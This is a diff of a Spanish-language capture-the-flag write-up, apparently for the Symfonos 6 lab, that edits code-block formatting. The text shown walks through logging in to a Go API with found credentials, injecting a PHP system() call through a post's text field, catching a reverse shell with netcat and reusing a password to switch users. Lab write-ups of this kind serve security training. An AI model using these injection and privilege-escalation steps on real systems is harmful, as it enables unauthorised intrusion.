@@ -212,6 +212,7 @@ func ApplyRoutes(r *gin.Engine) {
 
 <h5>Login en la API:</h5>
 - En la ruta `/api/v1.0/auth` vemos un `auth.go`, donde vemos que existen dos rutas
+
 ~~~ go
 package auth
 import (
@@ -227,6 +228,7 @@ func ApplyRoutes(r *gin.RouterGroup) {
 }
 ~~~
 - En el recurso `auth.ctrl.go` podemos encontrar una función que nos indicaría mas o menos como loguearnos y con que parámetros trabaja el `json`:
+
 ~~~ go
 func login(c *gin.Context) {
         db := c.MustGet("db").(*gorm.DB)
@@ -236,7 +238,8 @@ func login(c *gin.Context) {
         }
 ~~~
 - Por lo que nos podríamos loguear desde `curl` haciendo uso de los siguientes parámetros:
-  ~~~ bash
+
+~~~ bash
   ┌──(kali💀Dedsec)-[~/…/symfonos-api/api/v1.0/auth]
 └─$ curl 'http://symfonos.vh:5000/ls2o4g/v1.0/auth/login' -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}';echo
 
@@ -265,7 +268,8 @@ func ApplyRoutes(r *gin.RouterGroup) {
 }
 ~~~
 - Además, tenemos `posts.auth.go`, en donde se muestra una función `create`, la cual nos da la forma en la que debemos mandar nuestra solicitud. Al parecer nos pide loguearnos también pero para eso ya tenemos nuestro JWT:
-  ~~~ go
+
+~~~ go
   func create(c *gin.Context) {
         db := c.MustGet("db").(*gorm.DB)
         type RequestBody struct {
@@ -287,7 +291,7 @@ func ApplyRoutes(r *gin.RouterGroup) {
 ~~~
 - Requerimos llenar el campo `text` con nuestro texto, intentaremos ejecutar un comando con esto mismo.
 - Debemos usar `$` en la petición para que nos interprete el escape de las comillas simples, pues no podemos usar dobles comillas:
-  ~~~ bash 
+~~~ bash 
 ┌──(kali💀Dedsec)-[~/…/symfonos-api/api/v1.0/posts]
 └─$ curl -X PATCH 'http://symfonos.vh:5000/ls2o4g/v1.0/posts/1' -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDI0OTIxODYsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.MC2SfVYDK_cIPXYL93IdLm0E0rJF_onuiV7aWd_OCdw" -d $'{"text": "system(\'id\')"}';echo
 
@@ -306,7 +310,7 @@ curl -X PATCH 'http://symfonos.vh:5000/ls2o4g/v1.0/posts/1' -b "token=eyJhbGciOi
 ~~~
 - Nos ponemos en escucha con netcat y deberíamos ganar acceso:
 - Una vez dentro nos hacemos todo el ritual para tratar la TTY:
-  ~~~ bash
+~~~ bash
 script /dev/null -c bash
 ^Z
 #Dejamos nuestra sesión en segundo plano
@@ -322,6 +326,7 @@ stty rows 44 columns 184
 ***
 <h3>PrivEsc:</h3>
 - A nadie le gusta ser `apache`, así que agradecemos a la reutilización de contraseñas que nos permitirá hacer un `user pivoting` hacia `achilles`
+
 ~~~ bash
 bash-4.2$ su achilles
 Password: h2sBr9gryBunKdF9
@@ -329,7 +334,7 @@ bash-4.2$ id
 uid=1000(achilles) gid=1000(achilles) groups=1000(achilles),48(apache)
 ~~~
 - Bien, vemos que nuestro usuario es capaz de ejecutar cualquier cosa que se ejecute con `go` como root:
-  ~~~ bash
+~~~ bash
   bash-4.2$ sudo -l
 Matching Defaults entries for achilles on symfonos6:
     !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
